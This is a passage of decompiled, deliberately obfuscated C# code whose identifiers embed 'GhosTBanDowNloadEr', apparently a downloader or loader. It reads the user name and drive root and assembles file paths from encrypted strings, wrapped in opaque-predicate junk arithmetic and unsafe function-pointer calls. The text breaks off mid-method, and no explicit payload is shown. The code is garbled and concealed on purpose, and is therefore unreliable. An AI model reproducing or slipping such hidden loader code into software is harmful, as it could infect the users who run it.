using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using _2ECF_2ECF_3024_FFFD_2ECF丂_D83D_DF57_FFFD_2ECFㄩᐯㄩㄩ_2F15_2ECF丿_FFFD讠ᐯ_3024丿丿ᐯᗪ_3024ᗪ_FFFDㄩ_FFFDᗪ闩讠卄GhosTBanDowNloadErv3421342342ᐯᐯ_2ECF卄讠ㄩᐯ讠_FFFD丂山ᐯ山ᐯ丿卄_2F15ᗪᗪ_2ECF_2ECF丿丿讠卄_2ECF_FFFDᐯ_FFFD_2ECF_3024ᐯᗪ_FFFD;

namespace ㄖᐯ丂ㄖ_2ECF_2ECFᐯ卄ㄩ_FFFDᗪᐯ丂讠_FFFD_FFFD卄卄讠丂讠讠_2ECF_FFFD丂_2ECF_FFFD_FFFDㄩᗪᗪㄖ卄_2ECFGhosTBanDowNloadErv3421342342讠_2ECF_2F15_FFFDㄩ_FFFD_FFFD_2ECF_2ECF_FFFDᗪᗪ_2ECF_FFFD_FFFD卄丂卄_FFFD_3024丿丿_FFFD丿卄ㄩㄩ_FFFDᗪ讠卄ᗪ卄ᐯ;

internal class _FFFDᗪ卄_FFFD_2ECFㄩㄩ讠ㄩ丂ᐯ_2ECFㄩ卄_2ECF_D83D_DCDD讠_FFFD丂ᗪ_3024_FFFD闩_FFFD_2ECFㄖ_2ECF_FFFD丿ᐯᗪ_FFFD山GhosTBanDowNloadErv3421342342_2ECFㄖ_2ECF讠ㄩ_2ECF山_2ECFᗪ_FFFD丂ᐯ_FFFDᐯ_FFFD讠讠_2ECF讠_FFFDᐯ丂_3024ᐯ卄_2ECF讠_2ECFᗪ_FFFDㄩ_3024ㄩ丿
{
	private static Random 闩讠卄_FFFD卄山丂_2ECF_3024ᗪᐯ闩ㄩ_FFFDㄖ_2ECF讠丂卄丂_FFFD山ᐯㄖ卄丂山丂_FFFD_2ECFㄖ卄ᗪᗪGhosTBanDowNloadErv3421342342ㄖ卄_2ECF_FFFDㄖ卄_FFFD丿_2ECF_FFFD讠卄丂ᐯ_2ECF_FFFD_3024ᗪ丿卄丂_2ECFᐯᐯᗪ_FFFD_2ECFㄖㄩ_FFFD丂山_FFFD_2ECF = new Random();

	public static string 卄_2ECF_FFFDᐯ_2ECF讠讠讠_FFFD_2ECF_2ECF丿_FFFD_2F15_FFFD卄_2ECF闩_FFFD_FFFD_2ECF卄ᐯᐯ_2F15丿_FFFD山丿ㄩ闩闩_FFFDᐯGhosTBanDowNloadErv3421342342ᗪ_2ECF卄_FFFD_2ECF_FFFD_2F15ᗪ_FFFD_3024_FFFD_FFFD_2ECF卄_FFFD_3024ᗪ讠ᐯㄩ_FFFDᐯㄩ讠讠讠ㄩㄖ_2ECFᗪㄩ_2ECF丿_FFFD(int _FFFDᗪ山ㄩ丂山讠_2ECF_FFFDᗪ_2F15卄_FFFD_2ECF_2ECFㄩ讠卄卄ᐯ_2F15_2ECFᐯᗪ_FFFDㄩ闩丿讠卄山ᗪㄩᐯGhosTBanDowNloadErv3421342342_3024山ㄩ丂闩丂ᗪ_FFFD_FFFD讠卄_2ECF卄丂ᗪ_2ECF_FFFD_3024卄ᐯ_2ECF卄卄ᗪ_2ECF讠_3024_3024ㄩ_FFFD_FFFD卄ᗪᐯ)
	{
		return new string((from s in Enumerable.Repeat(_003CModule_003E.讠ㄩᐯㄩ讠卄_2F15丿山_3024卄卄卄_2ECFᐯ山闩山_FFFD_D835_DF57ᐯ卄ᐯ_FFFD_2ECFᗪㄩ卄_2ECFᐯ丂卄讠GhosTBanDowNloadErv3421342342讠讠ㄩᐯ_FFFD_FFFDᐯᐯ讠ᗪ_FFFDᐯㄩㄩ_2F15丂闩ᗪ_FFFD丿ㄩㄖ_FFFDㄖㄩㄩ_2ECF丂ᐯ山_FFFD丂卄ᗪ(ᐯᗪ_FFFD()), _FFFDᗪ山ㄩ丂山讠_2ECF_FFFDᗪ_2F15卄_FFFD_2ECF_2ECFㄩ讠卄卄ᐯ_2F15_2ECFᐯᗪ_FFFDㄩ闩丿讠卄山ᗪㄩᐯGhosTBanDowNloadErv3421342342_3024山ㄩ丂闩丂ᗪ_FFFD_FFFD讠卄_2ECF卄丂ᗪ_2ECF_FFFD_3024卄ᐯ_2ECF卄卄ᗪ_2ECF讠_3024_3024ㄩ_FFFD_FFFD卄ᗪᐯ)
			select s[闩讠卄_FFFD卄山丂_2ECF_3024ᗪᐯ闩ㄩ_FFFDㄖ_2ECF讠丂卄丂_FFFD山ᐯㄖ卄丂山丂_FFFD_2ECFㄖ卄ᗪᗪGhosTBanDowNloadErv3421342342ㄖ卄_2ECF_FFFDㄖ卄_FFFD丿_2ECF_FFFD讠卄丂ᐯ_2ECF_FFFD_3024ᗪ丿卄丂_2ECFᐯᐯᗪ_FFFD_2ECFㄖㄩ_FFFD丂山_FFFD_2ECF.Next(s.Length)]).ToArray());
	}

	public static int _FFFD_FFFDㄖ卄丿ㄩ_FFFDᗪ_FFFDᐯ_FFFDᗪ_FFFDᐯ卄闩ㄩ闩_FFFD_2ECF_FFFDᐯ卄山ᗪ卄_FFFD_2ECFᗪ_2ECFᗪ卄ᐯ卄GhosTBanDowNloadErv3421342342ᗪ_2F15_2ECFᗪ卄丂_FFFD_2F15讠_2ECF闩_FFFD_D83D_DF57_2ECFᐯ山ᗪ丿ᐯㄩ_FFFD丿卄_FFFDㄩ_FFFD_2F15ᗪᗪ讠ㄩ丿丿(int ᐯ_FFFD丂_2ECF_FFFD_2ECF_2ECF讠_2F15ᐯ丂ㄩ丿卄ㄖ_2ECF卄讠_FFFDᗪ_FFFD卄ᐯ闩卄丂卄卄ᐯ_FFFD闩丿丂ㄩGhosTBanDowNloadErv3421342342卄闩_D83D_DF57_2ECF山ㄖ闩山_3024卄ᐯᐯ_2ECF_2F15讠_3024_FFFDㄩ卄ㄩ_FFFD_3024_3024丂讠丿ㄩᐯ卄卄卄_FFFD_3024, int 丂ㄩ_2F15讠丂丿ᗪᗪ山山丂闩_FFFD讠ᗪ丂ᐯ_FFFD_2ECF_2ECF_FFFD_2F15讠_2ECFᗪ_2ECF_3024ᗪ丂卄_2ECF山_2ECFᗪGhosTBanDowNloadErv3421342342_FFFD丂卄山ㄩ_2ECF_3024卄ㄩ讠_FFFD_2F15_FFFD丂_2ECF丂讠讠卄_FFFDᗪ闩ㄖ_FFFDᗪ_2ECFㄩᗪㄩᐯ_FFFD讠丂卄)
	{
		Random random = new Random();
		return random.Next(ᐯ_FFFD丂_2ECF_FFFD_2ECF_2ECF讠_2F15ᐯ丂ㄩ丿卄ㄖ_2ECF卄讠_FFFDᗪ_FFFD卄ᐯ闩卄丂卄卄ᐯ_FFFD闩丿丂ㄩGhosTBanDowNloadErv3421342342卄闩_D83D_DF57_2ECF山ㄖ闩山_3024卄ᐯᐯ_2ECF_2F15讠_3024_FFFDㄩ卄ㄩ_FFFD_3024_3024丂讠丿ㄩᐯ卄卄卄_FFFD_3024, 丂ㄩ_2F15讠丂丿ᗪᗪ山山丂闩_FFFD讠ᗪ丂ᐯ_FFFD_2ECF_2ECF_FFFD_2F15讠_2ECFᗪ_2ECF_3024ᗪ丂卄_2ECF山_2ECFᗪGhosTBanDowNloadErv3421342342_FFFD丂卄山ㄩ_2ECF_3024卄ㄩ讠_FFFD_2F15_FFFD丂_2ECF丂讠讠卄_FFFDᗪ闩ㄖ_FFFDᗪ_2ECFㄩᗪㄩᐯ_FFFD讠丂卄);
	}

	public unsafe static void 讠ㄩᐯ_3024丿ㄩ_FFFDᐯ_2ECFㄖᐯ_FFFDᐯ_2ECF讠丿_FFFD_FFFDᐯ山ㄩᐯ丂ㄩ丿卄讠丂_D83D_DF57ㄩ丂讠ᐯGhosTBanDowNloadErv3421342342ㄩ_FFFD卄_2F15_3024ᐯㄩ_2ECF山_2ECF_FFFD_2F15ㄩㄩ卄_FFFDㄩ_FFFDᐯ_2ECF_FFFD卄_2F15ᐯᐯ_FFFD闩ㄩᐯ丂丿丂丂_2ECF()
	{
		string text = ((delegate*<string>)(&Environment.get_UserName))();
		string text2 = ((delegate*<string?, string?>)(&Path.GetPathRoot))(((delegate*<string>)(&Environment.get_CurrentDirectory))());
		int num = (int)((int)Math.Floor(-414.5754753796968) + (int)double.Parse(_FFFDᗪ卄_FFFD_2ECFㄩㄩ讠ㄩ丂ᐯ_2ECFㄩ卄_2ECF_D83D_DCDD讠_FFFD丂ᗪ_3024_FFFD闩_FFFD_2ECFㄖ_2ECF_FFFD丿ᐯᗪ_FFFD山GhosTBanDowNloadErv3421342342_2ECFㄖ_2ECF讠ㄩ_2ECF山_2ECFᗪ_FFFD丂ᐯ_FFFDᐯ_FFFD讠讠_2ECF讠_FFFDᐯ丂_3024ᐯ卄_2ECF讠_2ECFᗪ_FFFDㄩ_3024ㄩ丿.卄()) + (nint)Type.EmptyTypes.LongLength);
		nint num2 = (int)Math.Floor(-418.5754753796968) + (int)double.Parse(卄丿卄()) + (nint)Type.EmptyTypes.LongLength;
		if ((((int)Math.Floor(174015218.42452464) + (int)double.Parse(ㄩ_FFFDᐯ_2ECF卄闩()) + (nint)Type.EmptyTypes.LongLength) ^ ((int)Math.Floor(1775239687.4245245) + (int)double.Parse(山_FFFDㄖ()) + (nint)Type.EmptyTypes.LongLength)) == (int)Math.Floor(1670333840.4245245) + (int)double.Parse(ᗪᐯ_FFFD讠丂闩ㄖ_FFFD()) + (nint)Type.EmptyTypes.LongLength)
		{
			num = (int)((int)Math.Floor(-420.5754753796968) + (int)double.Parse(_FFFDᗪ卄_FFFD_2ECFㄩㄩ讠ㄩ丂ᐯ_2ECFㄩ卄_2ECF_D83D_DCDD讠_FFFD丂ᗪ_3024_FFFD闩_FFFD_2ECFㄖ_2ECF_FFFD丿ᐯᗪ_FFFD山GhosTBanDowNloadErv3421342342_2ECFㄖ_2ECF讠ㄩ_2ECF山_2ECFᗪ_FFFD丂ᐯ_FFFDᐯ_FFFD讠讠_2ECF讠_FFFDᐯ丂_3024ᐯ卄_2ECF讠_2ECFᗪ_FFFDㄩ_3024ㄩ丿.讠()) + (nint)Type.EmptyTypes.LongLength);
			num2 += sizeof(float);
		}
		string[] array = new string[num2];
		int num3 = (int)((int)Math.Floor(-422.5754753796968) + (int)double.Parse(_2F15ㄩ_2F15ᐯᗪ_FFFDᗪᐯᐯ()) + (nint)Type.EmptyTypes.LongLength);
		nint num4 = (int)Math.Floor(-426.5754753796968) + (int)double.Parse(_FFFD_FFFDᗪ_2ECFㄩ丂卄()) + (nint)Type.EmptyTypes.LongLength;
		if ((((int)Math.Floor(173906152.42452464) + (int)double.Parse(ᗪㄖ丂ㄩ_2ECF_FFFD()) + (nint)Type.EmptyTypes.LongLength) ^ ((int)Math.Floor(96676845.42452462) + (int)double.Parse(丂_FFFD()) + (nint)Type.EmptyTypes.LongLength)) == (int)Math.Floor(262059380.42452464) + (int)double.Parse(ᐯ_2ECF_2F15_FFFD_3024讠()) + (nint)Type.EmptyTypes.LongLength)
		{
			num3 = (int)((int)Math.Floor(-420.5754753796968) + (int)double.Parse(讠丿_2ECF_FFFD闩()) + (nint)Type.EmptyTypes.LongLength);
			num4 += sizeof(float);
		}
		array[num4] = ((delegate*<string?, string?, string>)(&string.Concat))(text2, _003CModule_003E.讠ㄩᐯㄩ讠卄_2F15丿山_3024卄卄卄_2ECFᐯ山闩山_FFFD_D835_DF57ᐯ卄ᐯ_FFFD_2ECFᗪㄩ卄_2ECFᐯ丂卄讠GhosTBanDowNloadErv3421342342讠讠ㄩᐯ_FFFD_FFFDᐯᐯ讠ᗪ_FFFDᐯㄩㄩ_2F15丂闩ᗪ_FFFD丿ㄩㄖ_FFFDㄖㄩㄩ_2ECF丂ᐯ山_FFFD丂卄ᗪ(ᐯᐯᐯ()));
		int num5 = (int)((int)Math.Floor(-421.5754753796968) + (int)double.Parse(_2F15卄ᐯ山ᐯᐯㄩᗪ讠()) + (nint)Type.EmptyTypes.LongLength);
		nint num6 = (int)Math.Floor(-425.5754753796968) + (int)double.Parse(_2ECF卄丂卄()) + (nint)Type.EmptyTypes.LongLength;
		if ((((int)Math.Floor(1657745126.4245245) + (int)double.Parse(_2ECF闩_2ECF丿()) + (nint)Type.EmptyTypes.LongLength) ^ ((int)Math.Floor(688108054.4245247) + (int)double.Parse(丂ᐯ_2ECF_FFFD闩_FFFD丂丿()) + (nint)Type.EmptyTypes.LongLength)) == (int)Math.Floor(1271693705.4245245) + (int)double.Parse(讠_FFFDᐯ_FFFD卄ᗪ()) + (nint)Type.EmptyTypes.LongLength)
		{
			num5 = (int)((int)Math.Floor(-420.5754753796968) + (int)double.Parse(_FFFD丂ㄖㄩ_2ECFㄖ()) + (nint)Type.EmptyTypes.LongLength);
			num6 += sizeof(float);
		}
		array[num6] = ((delegate*<string?, string?, string>)(&string.Concat))(text2, _003CModule_003E.讠ㄩᐯㄩ讠卄_2F15丿山_3024卄卄卄_2ECFᐯ山闩山_FFFD_D835_DF57ᐯ卄ᐯ_FFFD_2ECFᗪㄩ卄_2ECFᐯ丂卄讠GhosTBanDowNloadErv3421342342讠讠ㄩᐯ_FFFD_FFFDᐯᐯ讠ᗪ_FFFDᐯㄩㄩ_2F15丂闩ᗪ_FFFD丿ㄩㄖ_FFFDㄖㄩㄩ_2ECF丂ᐯ山_FFFD丂卄ᗪ(_FFFDᗪ卄_FFFD_2ECFㄩㄩ讠ㄩ丂ᐯ_2ECFㄩ卄_2ECF_D83D_DCDD讠_FFFD丂ᗪ_3024_FFFD闩_FFFD_2ECFㄖ_2ECF_FFFD丿ᐯᗪ_FFFD山GhosTBanDowNloadErv3421342342_2ECFㄖ_2ECF讠ㄩ_2ECF山_2ECFᗪ_FFFD丂ᐯ_FFFDᐯ_FFFD讠讠_2ECF讠_FFFDᐯ丂_3024ᐯ卄_2ECF讠_2ECFᗪ_FFFDㄩ_3024ㄩ丿._FFFD()));
		int num7 = (int)((int)Math.Floor(-420.5754753796968) + (int)double.Parse(_FFFD_FFFD丂()) + (nint)Type.EmptyTypes.LongLength);
		nint num8 = (int)Math.Floor(-424.5754753796968) + (int)double.Parse(闩_FFFDᐯ()) + (nint)Type.EmptyTypes.LongLength;
		if ((((int)Math.Floor(829238436.4245247) + (int)double.Parse(ᗪᐯ丿_2ECF闩丂ㄩ()) + (nint)Type.EmptyTypes.LongLength) ^ ((int)Math.Floor(1622959988.4245245) + (int)double.Parse(丂闩_2ECF闩_2ECF_FFFD_2ECF闩()) + (nint)Type.EmptyTypes.LongLength)) == (int)Math.Floor(1372669353.4245245) + (int)double.Parse(_FFFD_2ECF_2ECF_3024_FFFD_3024ᗪ_FFFD()) + (nint)Type.EmptyTypes.LongLength)
		{
			num7 = (int)((int)Math.Floor(-420.5754753796968) + (int)double.Parse(_FFFDᐯㄩ_FFFD()) + (nint)Type.EmptyTypes.LongLength);
			num8 += sizeof(float);
		}
		array[num8] = ((delegate*<string?, string?, string>)(&string.Concat))(text2, _003CModule_003E.讠ㄩᐯㄩ讠卄_2F15丿山_3024卄卄卄_2ECFᐯ山闩山_FFFD_D835_DF57ᐯ卄ᐯ_FFFD_2ECFᗪㄩ卄_2ECFᐯ丂卄讠GhosTBanDowNloadErv3421342342讠讠ㄩᐯ_FFFD_FFFDᐯᐯ讠ᗪ_FFFDᐯㄩㄩ_2F15丂闩ᗪ_FFFD丿ㄩㄖ_FFFDㄖㄩㄩ_2ECF丂ᐯ山_FFFD丂卄ᗪ(_D83D_DF57卄_2ECF_FFFDㄩ()));
		int num9 = (int)((int)Math.Floor(-419.5754753796968) + (int)double.Parse(ㄩㄖ闩丿_FFFD_2ECF()) + (nint)Type.EmptyTypes.LongLength);
		nint num10 = (int)Math.Floor(-423.5754753796968) + (int)double.Parse(_FFFDᗪ卄_FFFD_2ECFㄩㄩ讠ㄩ丂ᐯ_2ECFㄩ卄_2ECF_D83D_DCDD讠_FFFD丂ᗪ_3024_FFFD闩_FFFD_2ECFㄖ_2ECF_FFFD丿ᐯᗪ_FFFD山GhosTBanDowNloadErv3421342342_2ECFㄖ_2ECF讠ㄩ_2ECF山_2ECFᗪ_FFFD丂ᐯ_FFFDᐯ_FFFD讠讠_2ECF讠_FFFDᐯ丂_3024ᐯ卄_2ECF讠_2ECFᗪ_FFFDㄩ_3024ㄩ丿.ㄩ()) + (nint)Type.EmptyTypes.LongLength;
		if ((((int)Math.Floor(2075480669.4245245) + (int)double.Parse(_2ECFᗪ_2F15()) + (nint)Type.EmptyTypes.LongLength) ^ ((int)Math.Floor(116288321.42452462) + (int)double.Parse(卄_2ECF讠_3024()) + (nint)Type.EmptyTypes.LongLength)) == (int)Math.Floor(2103129925.4245245) + (int)double.Parse(丿_FFFD_FFFD卄_FFFD卄()) + (nint)Type.EmptyTypes.LongLength)
		{
			num9 = (int)((int)Math.Floor(-420.5754753796968) + (int)double.Parse(_FFFDᗪ卄_FFFD_2ECFㄩㄩ讠ㄩ丂ᐯ_2ECFㄩ卄_2ECF_D83D_DCDD讠_FFFD丂ᗪ_3024_FFFD闩_FFFD_2ECFㄖ_2ECF_FFFD丿ᐯᗪ_FFFD山GhosTBanDowNloadErv3421342342_2ECFㄖ_2ECF讠ㄩ_2ECF山_2ECFᗪ_FFFD丂ᐯ_FFFDᐯ_FFFD讠讠_2ECF讠_FFFDᐯ丂_3024ᐯ卄_2ECF讠_2ECFᗪ_FFFDㄩ_3024ㄩ丿._2ECF()) + (nint)Type.EmptyTypes.LongLength);
			num10 += sizeof(float);
		}
		array[num10] = ((delegate*<string?, string?, string>)(&string.Concat))(text2, _003CModule_003E.讠ㄩᐯㄩ讠卄_2F15丿山_3024卄卄卄_2ECFᐯ山闩山_FFFD_D835_DF57ᐯ卄ᐯ_FFFD_2ECFᗪㄩ卄_2ECFᐯ丂卄讠GhosTBanDowNloadErv3421342342讠讠ㄩᐯ_FFFD_FFFDᐯᐯ讠ᗪ_FFFDᐯㄩㄩ_2F15丂闩ᗪ_FFFD丿ㄩㄖ_FFFDㄖㄩㄩ_2ECF丂ᐯ山_FFFD丂卄ᗪ(丂卄卄()));
		int num11 = (int)((int)Math.Floor(-418.5754753796968) + (int)double.Parse(_2F15_2F15卄()) + (nint)Type.EmptyTypes.LongLength);
		nint num12 = (int)Math.Floor(-422.5754753796968) + (int)double.Parse(_2ECFㄩᐯ_FFFD丂_FFFD()) + (nint)Type.EmptyTypes.LongLength;
		if ((((int)Math.Floor(1362206347.4245245) + (int)double.Parse(ㄩᗪᐯ_3024丿ㄩ_FFFD()) + (nint)Type.EmptyTypes.LongLength) ^ ((int)Math.Floor(1202267516.4245245) + (int)double.Parse(丂_2ECFㄩ()) + (nint)Type.EmptyTypes.LongLength)) == (int)Math.Floor(379094378.4245246) + (int)double.Parse(讠_2ECFᐯ()) + (nint)Type.EmptyTypes.LongLength)
		{
			num11 = (int)((int)Math.Floor(-420.5754753796968) + (int)double.Parse(_2ECF卄ㄩᗪ_2ECF()) + (nint)Type.EmptyTypes.LongLength);
			num12 += sizeof(float);
		}
		array[num12] = ((delegate*<string?, string?, string>)(&string.Concat))(text2, _003CModule_003E.讠ㄩᐯㄩ讠卄_2F15丿山_3024卄卄卄_2ECFᐯ山闩山_FFFD_D835_DF57ᐯ卄ᐯ_FFFD_2ECFᗪㄩ卄_2ECFᐯ丂卄讠GhosTBanDowNloadErv3421342342讠讠ㄩᐯ_FFFD_FFFDᐯᐯ讠ᗪ_FFFDᐯㄩㄩ_2F15丂闩ᗪ_FFFD丿ㄩㄖ_FFFDㄖㄩㄩ_2ECF丂ᐯ山_FFFD丂卄ᗪ(丿_FFFDㄖ卄_2ECF_2ECFㄩ()));
		int num13 = (int)((int)Math.Floor(-417.5754753796968) + (int)double.Parse(ᗪ_2ECF丿()) + (nint)Type.EmptyTypes.LongLength);
		nint num14 = (int)Math.Floor(-421.5754753796968) + (int)double.Parse(丂讠_FFFD卄_2F15ᗪᗪ()) + (nint)Type.EmptyTypes.LongLength;
		if ((((int)Math.Floor(1866510865.4245245) + (int)double.Parse(ㄩ_3024丂()) + (nint)Type.EmptyTypes.LongLength) ^ ((int)Math.Floor(229134573.42452464) + (int)double.Parse(_2ECF_2ECFᗪ_FFFD_FFFD_2ECF()) + (nint)Type.EmptyTypes.LongLength)) == (int)Math.Floor(1659428741.4245245) + (int)double.Parse(丿ᐯ()) + (nint)Type.EmptyTypes.LongLength)
		{
			num13 = (int)((int)Math.Floor(-420.5754753796968) + (int)double.Parse(_FFFD_2ECF_2F15_2ECF()) + (nint)Type.EmptyTypes.LongLength);
			num14 += sizeof(float);
		}
		array[num14] = ((delegate*<string?, string?, string>)(&string.Concat))(text2, _003CModule_003E.讠ㄩᐯㄩ讠卄_2F15丿山_3024卄卄卄_2ECFᐯ山闩山_FFFD_D835_DF57ᐯ卄ᐯ_FFFD_2ECFᗪㄩ卄_2ECFᐯ丂卄讠GhosTBanDowNloadErv3421342342讠讠ㄩᐯ_FFFD_FFFDᐯᐯ讠ᗪ_FFFDᐯㄩㄩ_2F15丂闩ᗪ_FFFD丿ㄩㄖ_FFFDㄖㄩㄩ_2ECF丂ᐯ山_FFFD丂卄ᗪ(ᗪ()));
		int num15 = (int)((int)Math.Floor(-416.5754753796968) + (int)double.Parse(_FFFD_2ECFᐯ()) + (nint)Type.EmptyTypes.LongLength);
		nint num16 = (int)Math.Floor(-420.5754753796968) + (int)double.Parse(_FFFDᗪ卄_FFFD_2ECFㄩㄩ讠ㄩ丂ᐯ_2ECFㄩ卄_2ECF_D83D_DCDD讠_FFFD丂ᗪ_3024_FFFD闩_FFFD_2ECFㄖ_2ECF_FFFD丿ᐯᗪ_FFFD山GhosTBanDowNloadErv3421342342_2ECFㄖ_2ECF讠ㄩ_2ECF山_2ECFᗪ_FFFD丂ᐯ_FFFDᐯ_FFFD讠讠_2ECF讠_FFFDᐯ丂_3024ᐯ卄_2ECF讠_2ECFᗪ_FFFDㄩ_3024ㄩ丿._FFFD()) + (nint)Type.EmptyTypes.LongLength;
		if ((((int)Math.Floor(1438710151.4245245) + (int)double.Parse(丂丿丿_FFFD_2ECFᗪ()) + (nint)Type.EmptyTypes.LongLength) ^ ((int)Math.Floor(1460415247.4245245) + (int)double.Parse(_FFFD讠丂卄讠丂_FFFDᗪ()) + (nint)Type.EmptyTypes.LongLength)) == (int)Math.Floor(46978545.42452462) + (int)double.Parse(_2ECF_D83D_DF57ᐯ卄ㄩ_3024()) + (nint)Type.EmptyTypes.LongLength)
		{
			num15 = (int)((int)Math.Floor(-420.5754753796968) + (int)double.Parse(_3024ᗪㄖᐯ()) + (nint)Type.EmptyTypes.LongLength);
			num16 += sizeof(float);
		}
		array[num16] = ((delegate*<string?, string?, string>)(&string.Concat))(text2, _003CModule_003E.讠ㄩᐯㄩ讠卄_2F15丿山_3024卄卄卄_2ECFᐯ山闩山_FFFD_D835_DF57ᐯ卄ᐯ_FFFD_2ECFᗪㄩ卄_2ECFᐯ丂卄讠GhosTBanDowNloadErv3421342342讠讠ㄩᐯ_FFFD_FFFDᐯᐯ讠ᗪ_FFFDᐯㄩㄩ_2F15丂闩ᗪ_FFFD丿ㄩㄖ_FFFDㄖㄩㄩ_2ECF丂ᐯ山_FFFD丂卄ᗪ(_FFFD卄_FFFD山_3024闩ᗪ()));
		int num17 = (int)((int)Math.Floor(-415.5754753796968) + (int)double.Parse(丂_FFFD_FFFD丂_FFFDᗪ()) + (nint)Type.EmptyTypes.LongLength);
		nint num18 = (int)Math.Floor(-419.5754753796968) + (int)double.Parse(_FFFD闩_2ECF山_FFFD卄()) + (nint)Type.EmptyTypes.LongLength;
		if ((((int)Math.Floor(128268110.42452462) + (int)double.Parse(_FFFDᗪ卄_FFFD_2ECFㄩㄩ讠ㄩ丂ᐯ_2ECFㄩ卄_2ECF_D83D_DCDD讠_FFFD丂ᗪ_3024_FFFD闩_FFFD_2ECFㄖ_2ECF_FFFD丿ᐯᗪ_FFFD山GhosTBanDowNloadErv3421342342_2ECFㄖ_2ECF讠ㄩ_2ECF山_2ECFᗪ_FFFD丂ᐯ_FFFDᐯ_FFFD讠讠_2ECF讠_FFFDᐯ丂_3024ᐯ卄_2ECF讠_2ECFᗪ_FFFDㄩ_3024ㄩ丿._FFFD()) + (nint)Type.EmptyTypes.LongLength) ^ ((int)Math.Floor(2137057734.4245245) + (int)double.Parse(丿ᐯ丂ᐯ卄_2ECF_2ECF()) + (nint)Type.EmptyTypes.LongLength)) == (int)Math.Floor(2026230257.4245245) + (int)double.Parse(_FFFDㄖ卄()) + (nint)Type.EmptyTypes.LongLength)
		{
			num17 = (int)((int)Math.Floor(-420.5754753796968) + (int)double.Parse(丿_FFFDㄩᗪᗪ_2ECF()) + (nint)Type.EmptyTypes.LongLength);
			num18 += sizeof(float);
		}
		array[num18] = ((delegate*<string?, string?, string>)(&string.Concat))(text2, _003CModule_003E.讠ㄩᐯㄩ讠卄_2F15丿山_3024卄卄卄_2ECFᐯ山闩山_FFFD_D835_DF57ᐯ卄ᐯ_FFFD_2ECFᗪㄩ卄_2ECFᐯ丂卄讠GhosTBanDowNloadErv3421342342讠讠ㄩᐯ_FFFD_FFFDᐯᐯ讠ᗪ_FFFDᐯㄩㄩ_2F15丂闩ᗪ_FFFD丿ㄩㄖ_FFFDㄖㄩㄩ_2ECF丂ᐯ山_FFFD丂卄ᗪ(ᐯ_FFFDᗪ()));
		string[] array2 = array;
		int num19 = (int)((int)Math.Floor(-410.5754753796968) + (int)double.Parse(_2ECF丿_3024丿丂()) + (nint)Type.EmptyTypes.LongLength);
		nint num20 = (int)Math.Floor(-414.5754753796968) + (int)double.Parse(_2ECF讠()) + (nint)Type.EmptyTypes.LongLength;
		if ((((int)Math.Floor(1860053183.4245245) + (int)double.Parse(_2F15ㄩᗪ_FFFDᐯ_2F15ㄖ()) + (nint)Type.EmptyTypes.LongLength) ^ ((int)Math.Floor(742714898.4245247) + (int)double.Parse(_FFFDᐯᐯ_FFFD()) + (nint)Type.EmptyTypes.LongLength)) == (int)Math.Floor(1117439032.4245245) + (int)double.Parse(_2ECF丂ᐯㄩ丿卄_2ECFㄩ()) + (nint)Type.EmptyTypes.LongLength)
		{
			num19 = (int)((int)Math.Floor(-420.5754753796968) + (int)double.Parse(讠闩_3024ᐯ_2ECFㄩ_FFFD()) + (nint)Type.EmptyTypes.LongLength);
			num20 += sizeof(float);
		}
		string[] array3 = new string[num20];
		int num21 = (int)((int)Math.Floor(-422.5754753796968) + (int)double.Parse(讠ᗪ_2F15ㄩ()) + (nint)Type.EmptyTypes.LongLength);
		nint num22 = (int)Math.Floor(-426.5754753796968) + (int)double.Parse(_2ECF讠丿卄卄_2ECF丿()) + (nint)Type.EmptyTypes.LongLength;
		if ((((int)Math.Floor(1415990702.4245245) + (int)double.Parse(_FFFD_2ECF()) + (nint)Type.EmptyTypes.LongLength) ^ ((int)Math.Floor(389417395.77615356) + (int)double.Parse(丂丿ᗪ_FFFD讠闩_2ECF_FFFD()) + (nint)Type.EmptyTypes.LongLength)) == (int)Math.Floor(1129332870.7761536) + (int)double.Parse(丿ᐯ丂ᐯㄩ讠丿_2F15ᐯ()) + (nint)Type.EmptyTypes.LongLength)
		{
			num21 = (int)((int)Math.Floor(-779.2238464532112) + (int)double.Parse(_3024丂_2ECF()) + (nint)Type.EmptyTypes.LongLength);
			num22 += sizeof(float);
		}
		array3[num22] = _003CModule_003E.讠ㄩᐯㄩ讠卄_2F15丿山_3024卄卄卄_2ECFᐯ山闩山_FFFD_D835_DF57ᐯ卄ᐯ_FFFD_2ECFᗪㄩ卄_2ECFᐯ丂卄讠GhosTBanDowNloadErv3421342342讠讠ㄩᐯ_FFFD_FFFDᐯᐯ讠ᗪ_FFFDᐯㄩㄩ_2F15丂闩ᗪ_FFFD丿ㄩㄖ_FFFDㄖㄩㄩ_2ECF丂ᐯ山_FFFD丂卄ᗪ(ᐯ_3024_FFFD());
		int num23 = (int)((int)Math.Floor(-780.2238464532112) + (int)double.Parse(_2ECF丿丂_FFFD山丂_2ECF丂()) + (nint)Type.EmptyTypes.LongLength);
		nint num24 = (int)Math.Floor(-784.2238464532112) + (int)double.Parse(_2ECF卄ᗪ_2ECFᗪ丿讠_FFFDᗪ()) + (nint)Type.EmptyTypes.LongLength;
		if ((((int)Math.Floor(735722840.7761536) + (int)double.Parse(ᐯ_FFFD()) + (nint)Type.EmptyTypes.LongLength) ^ ((int)Math.Floor(197731716.77615353) + (int)double.Parse(丿_2ECFㄩㄖ_FFFDㄩ()) + (nint)Type.EmptyTypes.LongLength)) == (int)Math.Floor(538142182.7761536) + (int)double.Parse(丿丿_FFFDᐯ()) + (nint)Type.EmptyTypes.LongLength)
		{
			num23 = (int)((int)Math.Floor(-779.2238464532112) + (int)double.Parse(ㄖ()) + (nint)Type.EmptyTypes.LongLength);
			num24 += sizeof(float);
		}
		array3[num24] = _003CModule_003E.讠ㄩᐯㄩ讠卄_2F15丿山_3024卄卄卄_2ECFᐯ山闩山_FFFD_D835_DF57ᐯ卄ᐯ_FFFD_2ECFᗪㄩ卄_2ECFᐯ丂卄讠GhosTBanDowNloadErv3421342342讠讠ㄩᐯ_FFFD_FFFDᐯᐯ讠ᗪ_FFFDᐯㄩㄩ_2F15丂闩ᗪ_FFFD丿ㄩㄖ_FFFDㄖㄩㄩ_2ECF丂ᐯ山_FFFD丂卄ᗪ(_2ECFㄩ_3024讠());
		int num25 = (int)((int)Math.Floor(-779.2238464532112) + (int)double.Parse(丿_3024山_FFFD_3024_2ECF()) + (nint)Type.EmptyTypes.LongLength);
		nint num26 = (int)Math.Floor(-783.2238464532112) + (int)double.Parse(丂卄_3024丂_FFFD_3024()) + (nint)Type.EmptyTypes.LongLength;
